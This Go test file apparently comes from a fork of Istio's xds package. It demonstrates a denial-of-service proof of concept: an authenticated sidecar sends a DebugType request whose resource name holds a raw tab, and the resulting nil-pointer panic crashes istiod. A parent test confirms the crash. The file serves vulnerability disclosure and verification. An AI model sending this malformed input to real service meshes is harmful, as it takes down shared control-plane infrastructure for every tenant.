package xds

import (
	"net/http"
	"os"
	"os/exec"
	"strings"
	"testing"

	discovery "github.com/envoyproxy/go-control-plane/envoy/service/discovery/v3"

	"istio.io/istio/pilot/pkg/model"
	v3 "istio.io/istio/pilot/pkg/xds/v3"
	"istio.io/istio/pkg/spiffe"
)

// TestZeroDayADSCrash_Child runs the ACTUAL ADS request handler (processRequest) exactly as the
// gRPC stream goroutine does (ctx.Process(req)) — with NO recover — for a malformed XDS DebugType
// request. When ZERODAY_CHILD=1 this crashes the process, demonstrating the istiod-wide DoS.
func TestZeroDayADSCrash_Child(t *testing.T) {
	if os.Getenv("ZERODAY_CHILD") != "1" {
		t.Skip("child-only; launched by TestZeroDayADSCrash_Parent")
	}

	s := &DiscoveryServer{
		adsClients:    map[string]*Connection{},
		debugHandlers: map[string]string{},
		Generators:    map[string]model.XdsResourceGenerator{},
	}
	internalMux := s.InitDebug(http.NewServeMux(), false, nil)
	s.Generators[v3.DebugType] = NewDebugGen(s, "istio-system", internalMux)

	// A normal authenticated mesh sidecar: VerifiedIdentity is set by authorize() at connect time.
	proxy := &model.Proxy{
		Type: model.SidecarProxy, ID: "attacker.team-a", ConfigNamespace: "team-a",
		Metadata:         &model.NodeMetadata{Namespace: "team-a"},
		VerifiedIdentity: &spiffe.Identity{TrustDomain: "cluster.local", Namespace: "team-a", ServiceAccount: "sa-a"},
	}
	con := newConnection("10.0.0.9:5555", nil)
	con.s = s
	con.proxy = proxy
	con.SetID(connectionID(proxy.ID))
	con.MarkInitialized()

	// One malformed resource name (raw tab -> url.Parse returns nil,err).
	req := &discovery.DiscoveryRequest{
		TypeUrl:       v3.DebugType,
		ResourceNames: []string{"config_dump\t"},
	}
	// This is the exact call the stream loop makes. No recover anywhere below -> process dies.
	_ = s.processRequest(req, con)
}

// TestZeroDayADSCrash_Parent launches the child in a subprocess and asserts it CRASHED with a
// nil-pointer dereference originating in the fork's parseAndValidateDebugRequest.
func TestZeroDayADSCrash_Parent(t *testing.T) {
	cmd := exec.Command(os.Args[0], "-test.run", "^TestZeroDayADSCrash_Child$", "-test.v")
	cmd.Env = append(os.Environ(), "ZERODAY_CHILD=1")
	out, err := cmd.CombinedOutput()
	// Strip control chars so the captured panic is printable.
	clean := strings.Map(func(r rune) rune {
		if r < 0x20 && r != '\n' {
			return -1
		}
		return r
	}, string(out))

	if err == nil {
		t.Fatalf("expected child process to CRASH, but it exited 0.\n%s", clean)
	}
	t.Logf("child exited with: %v (a crash, as expected for an istiod-wide DoS)", err)
	if !strings.Contains(clean, "invalid memory address or nil pointer dereference") {
		t.Fatalf("child did not crash with nil-deref; output:\n%s", clean)
	}
	if !strings.Contains(clean, "parseAndValidateDebugRequest") {
		t.Fatalf("crash not attributable to parseAndValidateDebugRequest; output:\n%s", clean)
	}
	// Show the smoking-gun stack lines.
	for _, line := range strings.Split(clean, "\n") {
		if strings.Contains(line, "parseAndValidateDebugRequest") ||
			strings.Contains(line, "DebugGen") ||
			strings.Contains(line, "processRequest") ||
			strings.Contains(line, "nil pointer") {
			t.Logf("STACK> %s", strings.TrimSpace(line))
		}
	}
}
